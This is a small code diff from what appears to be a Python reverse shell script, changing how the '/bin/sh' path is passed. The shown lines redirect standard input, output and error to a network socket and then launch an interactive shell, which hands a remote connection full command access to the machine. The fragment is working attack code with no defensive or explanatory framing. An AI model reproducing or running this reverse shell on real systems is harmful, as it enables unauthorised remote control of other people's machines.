@@ -19,10 +19,11 @@ def main(): # Documentation has been added on README.md
         logger.exception("Connection refused by the remote host: %s", e)
 
     try:
+        filename="/bin/sh"
         os.dup2(sock_conn.fileno(),0)
         os.dup2(sock_conn.fileno(),1)
         os.dup2(sock_conn.fileno(),2)
-        subprocess.call(["/bin/sh","-i"]);
+        subprocess.call([filename,"-i"]);
 
 
     except OSError as e:
